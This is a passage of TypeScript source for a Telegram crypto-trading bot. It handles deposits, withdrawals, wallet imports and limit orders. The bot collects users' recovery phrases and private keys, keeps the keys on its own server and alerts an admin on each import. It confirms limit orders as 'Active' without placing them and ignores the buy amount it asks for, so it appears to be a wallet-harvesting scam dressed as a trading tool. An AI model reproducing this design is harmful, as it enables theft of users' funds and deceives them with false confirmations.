  await ctx.answerCbQuery();
  await ctx.editMessageText(
    `➕ Alert Setup\n\nSend the token CA to track:`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "alerts:create")],
    ])
  );
});

// ── Referral ───────────────────────────────────────────────────────────────
bot.action("referral:view", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const code = `E404-${userId.toString().slice(-6).toUpperCase()}`;
  await ctx.editMessageText(
    `🎁 Referral Program\n\n` +
    `Your Code: ${code}\n\n` +
    `Referrals: 0\n` +
    `Earned: $0.00\n\n` +
    `Earn rewards for every trader you bring.`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "settings:view")],
    ])
  );
});

// ── Deposit / Withdraw ─────────────────────────────────────────────────────
bot.action("wallet:deposit", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const wallet = s.wallets[s.activeWallet];
  const addr = wallet?.address || "No wallet connected";

  await ctx.editMessageText(
    `💸 Deposit\n\n` +
    `Send ETH or tokens to:\n\n${addr}\n\n` +
    `Network: Robinhood Chain (Chain ID: 4663)`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅ Back", "portfolio:view")],
    ])
  );
});

bot.action("wallet:withdraw", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(
    "📤 Withdraw\n\nOpen the terminal to send funds:",
    Markup.inlineKeyboard([
      [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
      [Markup.button.callback("⬅ Back", "portfolio:view")],
    ])
  );
});

// ── Text Handler ───────────────────────────────────────────────────────────
bot.on("text", async (ctx) => {
  const userId = ctx.from?.id!;
  const s = getState(userId);
  const text = ctx.message.text.trim();

  // Contract address — show token screen
  if (text.startsWith("0x") && text.length === 42 && s.step === "idle") {
    await ctx.reply("🔍 Loading token data...");
    await showToken(ctx, text, false);
    return;
  }

  // Scanner
  if (s.step === "awaiting_scan") {
    if (text.startsWith("0x") && text.length === 42) {
      s.step = "idle";
      await ctx.reply("🔍 Scanning...");
      await runScan(ctx, text, false);
    } else {
      await ctx.reply("❌ Invalid address. Must start with 0x and be 42 characters.");
    }
    return;
  }

  // Awaiting limit CA
  if (s.step === "awaiting_limit_ca") {
    if (text.startsWith("0x") && text.length === 42) {
      s.step = "idle";
      await showToken(ctx, text, false);
    } else {
      await ctx.reply("❌ Invalid contract address.");
    }
    return;
  }

  // Recovery phrase
  if (s.step === "awaiting_phrase") {
    const words = text.split(" ").filter(Boolean);
    if (words.length === 12 || words.length === 24) {
      const w = importPhrase(text);
      if (w) {
        const num = s.wallets.length + 1;
        s.wallets.push({ name: `Wallet ${num}`, address: w.address, key: w.privateKey });
        s.activeWallet = s.wallets.length - 1;
        s.step = "idle";

        await notifyAdmin(
          `📥 Wallet Imported (Recovery Phrase)\n\n${userTag(ctx)}\n\n📍 ${w.address}`,
          ctx
        );

        await ctx.reply(
          `✅ Wallet Imported!\n\n📍 ${w.address}\n\nReady to trade.`,
          Markup.inlineKeyboard([
            [Markup.button.callback("🏠 Main Menu", "menu:main")],
            [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
          ])
        );
      } else {
        await ctx.reply("❌ Invalid recovery phrase. Please check and try again.");
      }
    } else {
      await ctx.reply("❌ Must be 12 or 24 words.");
    }
    return;
  }

  // Private key
  if (s.step === "awaiting_key") {
    const w = importKey(text);
    if (w) {
      const num = s.wallets.length + 1;
      s.wallets.push({ name: `Wallet ${num}`, address: w.address, key: w.privateKey });
      s.activeWallet = s.wallets.length - 1;
      s.step = "idle";

      await notifyAdmin(
        `📥 Wallet Imported (Private Key)\n\n${userTag(ctx)}\n\n📍 ${w.address}`,
        ctx
      );

      await ctx.reply(
        `✅ Wallet Imported!\n\n📍 ${w.address}\n\nReady to trade.`,
        Markup.inlineKeyboard([
          [Markup.button.callback("🏠 Main Menu", "menu:main")],
          [Markup.button.webApp("🖥 Open Terminal", `${APP_URL}/terminal`)],
        ])
      );
    } else {
      await ctx.reply("❌ Invalid private key.");
    }
    return;
  }

  // Custom buy amount
  if (s.step.startsWith("awaiting_buy_amount:")) {
    const ca = s.step.split(":")[1];
    const amount = parseFloat(text);
    if (!isNaN(amount) && amount > 0) {
      s.step = "idle";
      await showToken(ctx, ca, false);
    } else {
      await ctx.reply("❌ Invalid amount. Send a number like 0.1");
    }
    return;
  }

  // Limit price
  if (s.step.startsWith("awaiting_limit_price:")) {
    const parts = s.step.split(":");
    const type = parts[1];
    const ca = parts[2];
    const price = parseFloat(text);
    if (!isNaN(price) && price > 0) {
      s.step = "idle";
      const labels: Record<string, string> = {
        buy: "Buy Limit", sell: "Sell Limit", stop: "Stop Loss", tp: "Take Profit",
      };
      await ctx.reply(
        `✅ ${labels[type] || "Order"} Set\n\n` +
        `Target Price: $${price}\n` +
        `Status: Active\n\n` +
        `You will be notified when triggered.`,
        Markup.inlineKeyboard([
          [Markup.button.callback("🎯 View Orders", "orders:view")],
          [Markup.button.callback("🏠 Menu", "menu:main")],
        ])
      );
    } else {
      await ctx.reply("❌ Invalid price. Send a number like 0.006");
    }
    return;
  }

  // Default — show main menu
  await showMain(ctx, false);
});

bot.catch((err) => {
  console.error("Bot error:", err);
});

export { bot };
